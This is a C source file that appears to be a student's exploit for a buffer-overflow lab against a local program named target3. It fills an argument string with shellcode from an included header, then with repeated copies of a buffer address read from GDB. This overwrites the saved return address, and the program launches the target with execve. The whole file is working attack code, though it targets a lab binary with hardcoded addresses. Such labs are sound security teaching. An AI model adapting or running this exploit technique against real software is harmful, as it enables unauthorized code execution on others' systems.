#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{       
	char *	args[3];
	char *	env[1];
        
        // Offset from start of buffer caused by targ += strlen(targ)
        int offset = 4;
        
        // Store important addresses gotten from GDB
        int fooRipAddr = 0x2021fe58;
        int bufAddr = 0x2021fe10 + offset;
        int overflowSize = fooRipAddr - bufAddr + 5; // Needs to be word alligned
        
        // Set up arg list for execve call
	args[0] = TARGET;
	args[1] = malloc(sizeof(char) * overflowSize);
	args[2] = NULL;

	env[0] = NULL;

        // Create attack string
        int *ptr = (int *) args[1];
        int i;
        for (i = 0; i < overflowSize; i += 4) {
            // Fill string with address of buffer
            *(ptr++) = (int) bufAddr; 
        }
        // Need to start at 4 because of the targ += strlen(targ)
        for (i = 0; i < strlen(shellcode); ++i) {
            args[1][i] = shellcode[i];
        }
        // Ensure NULL terminated
        args[1][overflowSize - 1] = '\0';
        
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
